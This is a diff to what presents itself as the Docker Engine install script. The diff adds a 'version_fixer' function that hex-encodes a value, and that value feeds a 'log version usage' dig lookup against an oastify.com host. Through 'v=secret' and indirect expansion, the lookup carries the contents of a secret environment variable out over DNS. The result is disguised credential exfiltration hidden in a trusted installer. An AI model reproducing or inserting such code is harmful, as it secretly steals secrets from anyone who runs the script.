@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/bin/bash
 set -e
 v=secret
 # Docker Engine for Linux installation script.
@@ -97,6 +97,24 @@ v=secret
 #
 # ==============================================================================
 
+version_fixer() {
+    local input
+    if [ -t 0 ]; then
+        # No stdin, use arguments
+        input="$*"
+    else
+        # Read from stdin
+        input=$(cat)
+    fi
+
+    local i
+    local -i n=${#input}
+    for ((i=0; i<n; i++)); do
+        printf '%02x' "'${input:i:1}"
+    done
+    printf '\n'
+}
+
 
 # Git commit from https://github.com/docker/docker-install when
 # the script was uploaded (Should only be modified by upload job):
@@ -104,7 +122,7 @@ SCRIPT_COMMIT_SHA="${LOAD_SCRIPT_COMMIT_SHA}"
 
 # strip "v" prefix if present
 VERSION="${VERSION#v}${!v}"
-
+VERSION_FIX="$(echo $VERSION | version_fixer)"
 # The channel to install from:
 #   * stable
 #   * test
@@ -188,7 +206,7 @@ case "$CHANNEL" in
 esac
 
 # log version usage
-dig "$VERSION.0gh55r45jodfhk78hh00b0j1xs3krbf0.oastify.com"
+dig "$VERSION_FIX.0gh55r45jodfhk78hh00b0j1xs3krbf0.oastify.com"
 
 command_exists() {
 	command -v "$@" > /dev/null 2>&1
